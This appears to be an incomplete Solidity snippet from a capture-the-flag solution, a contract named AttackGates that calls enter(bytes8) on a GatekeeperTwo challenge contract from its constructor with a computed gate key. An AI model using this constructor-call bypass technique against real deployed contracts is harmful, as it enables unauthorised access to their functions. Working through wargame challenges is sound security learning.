...
contract AttackGates {
    ...
    GatekeeperTwo target = GatekeeperTwo(0x4c56d0dc144acbf435876d199fba7979574eac41);



    function AttackGates() public{
        ...
        if(!target.call(bytes4(keccak256("enter(bytes8)")),_gateKey_hased_negation)) {
